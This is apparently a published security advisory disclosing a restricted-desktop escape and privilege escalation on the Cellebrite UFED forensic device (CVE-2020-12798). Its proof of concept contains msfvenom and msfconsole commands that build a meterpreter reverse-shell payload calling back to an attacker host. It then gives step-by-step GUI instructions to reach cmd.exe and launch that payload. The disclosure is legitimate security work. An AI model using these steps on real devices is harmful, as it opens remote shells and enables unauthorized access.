KL-001-2020-002 : Cellebrite Restricted Desktop Escape and Escalation of User Privilege
Title: Cellebrite Restricted Desktop Escape and Escalation of User Privilege
Advisory ID: KL-001-2020-002
Publication Date: 2020.05.14
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2020-002.txt
1. Vulnerability Details
Affected Vendor: Cellebrite
Affected Product: UFED
Affected Version: 5.0 - 7.5.0.845
Platform: Embedded Windows
CWE Classification: CWE-269: Improper Privilege Management,
CWE-20: Input Validation Error
CVE ID: CVE-2020-12798
2. Vulnerability Description
Cellebrite UFED device implements local operating system
policies that can be circumvented to obtain a command
prompt. From there privilege escalation is possible using
public exploits.
3. Technical Description
The Cellebrite UFED device implements local operating system
policies which are designed to limit access to operating system
functionality. These include but may not be limited to:
1. Preventing access to dialog such as Run, File Browser,
and Explorer.
and
2. Preventing access to process and application management tools
such as Task Manager and the Control Panel.
These policies can be circumvented by using functionality
that is permitted by the policy governing the use of the user
desktop. A user can leverage the Wireless Network connection
string to select certificate based authentication, which then
enables file dialogs that are able to be used to launch a
command prompt. Following this, privileges can be elevated
using off the shelf and publicly available exploits relevant
to the specific Windows version in use.
4. Mitigation and Remediation Recommendation
The vendor has informed KoreLogic that this vulnerability is

7. Proof of Concept
Begin by using the msfvenom binary to create a meterpreter
payload that will initiate a remote connection to a C2. Copy
the payload to a USB drive. Following this, use the msfconsole
binary to create a C2 connection handler with the multi/handler
functionality.
$ msfvenom -p windows/meterpreter/reverse\_tcp -f exe -o payload.exe LHOST=[REDACTED] LPORT=8888
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
Saved as: payload.exe
$ sudo mount -o rw /dev/sda1 a/
$ sudo cp payload.exe a/
$ sync
$ sudo umount a/
$ msfconsole

Now insert the USB drive where payload.exe resides into a
target Cellebrite device. Next, follow the steps below:
1. Open the Wireless Network Connection screen by clicking
on the WiFi icon in the bottom right hand corner of the
screen. This should be next to the system clock.
2. Select "Change advanced settings" -- this will bring up a
screen called Windows Network Connection Properties. Choose
the Wireless Networks tab.
3. Under the Preferred networks section, click the Add button
and then select the Authentication tab. Make sure "Enable IEEE
802.1x authentication for this network" is enabled.
4. Under EAP Type, select "Smart Card or other Certificate"
and then click the Properties button.
5. Under Trusted Root Certificate Authorities click the
View Certificate button. This will bring up a screen called
Certificate, choose the Details tab and click the "Copy to
File" button. This will bring up a screen called Certificate
Export Wizard.
6. Click Next and select any of the available export format
options. For example, choose the "DER encoded binary X.509"
option and click next.
7. Instead of typing out a export path click the Browse
button to open a file dialog. In the "File Name" box type:
\WINDOWS\System32\ and under "Save as type" select the "All
Files (\*.\*)" option. Hit the enter key.
8. Locate the cmd.exe file then drag and drop any DLL over
it. For example, choose the clusapi.dll file located near the
cmd.exe executable. This will open a Command Prompt screen as
an unprivileged user.
9. Type the drive letter to change into the USB drive containing
the payload.exe file.
C:\windows\system32>D:
D:\>payload.exe
This results in a connection back into Metasploit.
